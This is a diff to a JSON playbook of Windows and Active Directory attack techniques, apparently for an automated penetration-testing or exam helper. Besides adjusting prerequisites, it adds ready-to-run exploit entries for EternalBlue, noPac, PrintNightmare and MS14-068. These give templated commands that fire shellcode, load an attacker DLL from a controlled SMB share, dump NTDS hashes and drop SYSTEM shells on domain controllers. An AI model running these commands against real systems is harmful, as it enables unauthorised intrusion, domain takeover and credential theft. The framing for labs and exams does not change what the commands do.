@@ -742,7 +742,12 @@
    "requires_all": [
     "ad.user_list"
    ],
-   "requires_any": [],
+   "requires_any": [
+    "ad.domain_known",
+    "ad.dc_candidate",
+    "ldap.reachable",
+    "kerberos.reachable"
+   ],
    "obsoleted_by": [
     "loot.ntds"
    ],
@@ -898,8 +903,9 @@
    "requires_all": [],
    "requires_any": [
     "credential.available",
-    "foothold.windows"
-   ],
+    "foothold.windows",
+    "ad.acl_lead"
+    ],
    "deprioritize_when": [
     "loot.ntds"
    ],
@@ -1842,8 +1848,9 @@
    "requires_all": [],
    "requires_any": [
     "credential.available",
-    "ad.attack_paths"
-   ],
+    "ad.attack_paths",
+    "ad.acl_lead"
+    ],
    "obsoleted_by": [
     "loot.ntds"
    ],
@@ -2331,8 +2338,9 @@
    "requires_all": [],
    "requires_any": [
     "foothold.windows",
-    "ad.attack_paths"
-   ],
+    "ad.attack_paths",
+    "ad.acl_lead"
+    ],
    "obsoleted_by": [
     "loot.ntds"
    ],
@@ -2795,6 +2803,188 @@
      "tool": "impacket-raiseChild",
      "run": "impacket-raiseChild -target-exec {{target}} {{domain}}/{{user}}:'{{password}}'",
      "note": "The automated child-to-parent escalation: it performs the whole krbtgt-dump + extra-SID forge + psexec chain when you hold child-domain DA."
+    }
+   ]
+  },
+  {
+   "id": "eternalblue",
+   "title": "EternalBlue — MS17-010 SMB Remote Code Execution (CVE-2017-0144)",
+   "hypothesis": "An unpatched SMBv1 server (MS17-010) can be exploited for remote code execution as SYSTEM without credentials. Once nmap's smb-vuln-ms17-010 flags the host VULNERABLE, a scripted public exploit (or the Metasploit module) lands a SYSTEM shell directly. On the exam, prefer the scripted exploit — Metasploit is limited to a single target.",
+   "tool": "metasploit",
+   "tools": [
+    "metasploit",
+    "AutoBlue-MS17-010"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "smb.ms17_010"
+   ],
+   "produces": [
+    "foothold.windows",
+    "access.system"
+   ],
+   "autonomy": "manual",
+   "priority": 88,
+   "proves": "remote code execution as NT AUTHORITY\\SYSTEM on an MS17-010-vulnerable host",
+   "does_not_prove": "a stable shell on the first try — EternalBlue can crash the target; know the restart/revert behaviour before firing",
+   "report": {
+    "finding": "MS17-010 EternalBlue Remote Code Execution",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/3ndG4me/AutoBlue-MS17-010",
+    "https://nvd.nist.gov/vuln/detail/CVE-2017-0144"
+   ],
+   "commands": [
+    {
+     "tool": "nmap",
+     "run": "nmap -p445 --script smb-vuln-ms17-010 -oN {{scandir}}/ms17010.txt {{target}}",
+     "note": "Confirm VULNERABLE first."
+    },
+    {
+     "tool": "AutoBlue-MS17-010",
+     "run": "python3 eternalblue_exploit7.py {{target}} shellcode/sc_x64.bin",
+     "note": "Scripted public exploit — no Metasploit single-target limit."
+    },
+    {
+     "tool": "metasploit",
+     "run": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {{target}}; set LHOST {{lhost}}; run'",
+     "note": "Metasploit module — exam-limited to one target."
+    }
+   ]
+  },
+  {
+   "id": "nopac",
+   "title": "noPac / sAMAccountName spoofing (CVE-2021-42278 + CVE-2021-42287)",
+   "hypothesis": "On an unpatched DC, any authenticated user can rename a machine account to impersonate a DC and request a ticket as a privileged account — a straight line from a low-priv domain credential to Domain Admin / DCSync. Needs only valid creds and a vulnerable DC.",
+   "tool": "noPac.py",
+   "tools": [
+    "noPac.py",
+    "impacket-secretsdump"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "credential.available"
+   ],
+   "requires_any": [
+    "ad.dc_candidate",
+    "ad.domain_known"
+   ],
+   "produces": [
+    "loot.ntds",
+    "access.admin"
+   ],
+   "autonomy": "manual",
+   "priority": 80,
+   "proves": "a privileged ticket (typically DCSync/SYSTEM on the DC) from a low-priv domain account against an unpatched DC",
+   "does_not_prove": "anything on a patched DC — confirm the CVEs are unpatched (the tool's scan mode) before relying on it",
+   "report": {
+    "finding": "noPac Domain Privilege Escalation (CVE-2021-42278/42287)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/Ridter/noPac",
+    "https://nvd.nist.gov/vuln/detail/CVE-2021-42278"
+   ],
+   "commands": [
+    {
+     "tool": "noPac.py",
+     "run": "noPac.py {{domain}}/{{user}}:'{{password}}' -dc-ip {{target}} -dump -use-ldap",
+     "note": "Scan, exploit, and DCSync-dump in one."
+    }
+   ]
+  },
+  {
+   "id": "printnightmare",
+   "title": "PrintNightmare (CVE-2021-1675 / CVE-2021-34527)",
+   "hypothesis": "The Windows Print Spooler can be abused to load an attacker DLL as SYSTEM — remotely with any domain creds against a host running Spooler, or locally for privilege escalation. A reliable path to SYSTEM on unpatched hosts.",
+   "tool": "impacket",
+   "tools": [
+    "CVE-2021-1675.py",
+    "impacket-smbserver"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "credential.available"
+   ],
+   "requires_any": [
+    "ad.domain_known",
+    "foothold.windows",
+    "smb.reachable"
+   ],
+   "produces": [
+    "access.system"
+   ],
+   "autonomy": "manual",
+   "priority": 76,
+   "proves": "SYSTEM code execution via the Print Spooler on an unpatched host",
+   "does_not_prove": "success where the Spooler is disabled or the host is patched — check the Spooler is reachable first",
+   "report": {
+    "finding": "PrintNightmare Spooler RCE/LPE (CVE-2021-34527)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/cube0x0/CVE-2021-1675",
+    "https://nvd.nist.gov/vuln/detail/CVE-2021-34527"
+   ],
+   "commands": [
+    {
+     "tool": "impacket-smbserver",
+     "run": "impacket-smbserver share $(pwd) -smb2support",
+     "note": "Host your evil.dll on an SMB share you control."
+    },
+    {
+     "tool": "CVE-2021-1675.py",
+     "run": "CVE-2021-1675.py {{domain}}/{{user}}:'{{password}}'@{{target}} '\\\\{{lhost}}\\share\\evil.dll'",
+     "note": "Point the spooler at the UNC path to your DLL."
+    }
+   ]
+  },
+  {
+   "id": "ms14-068",
+   "title": "MS14-068 Kerberos PAC Forgery (CVE-2014-6324)",
+   "hypothesis": "On a DC missing the MS14-068 patch, a standard domain user can forge a Kerberos PAC claiming Domain Admin membership, yielding a golden-ticket-like TGT — low-priv creds straight to domain compromise. Legacy, but still seen on old lab DCs.",
+   "tool": "impacket-goldenPac",
+   "tools": [
+    "impacket-goldenPac"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "credential.available"
+   ],
+   "requires_any": [
+    "ad.dc_candidate",
+    "ad.domain_known"
+   ],
+   "produces": [
+    "kerberos.tickets",
+    "access.admin"
+   ],
+   "autonomy": "manual",
+   "priority": 66,
+   "proves": "a forged PAC TGT granting Domain Admin on an unpatched (pre-MS14-068) DC",
+   "does_not_prove": "anything on a patched DC — this only lands on legacy hosts",
+   "report": {
+    "finding": "MS14-068 Kerberos PAC Forgery (CVE-2014-6324)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://nvd.nist.gov/vuln/detail/CVE-2014-6324"
+   ],
+   "commands": [
+    {
+     "tool": "impacket-goldenPac",
+     "run": "impacket-goldenPac -dc-ip {{target}} {{domain}}/{{user}}:'{{password}}'@{{target}}",
+     "note": "Forges the PAC and drops a SYSTEM shell on the DC."
     }
    ]
   }
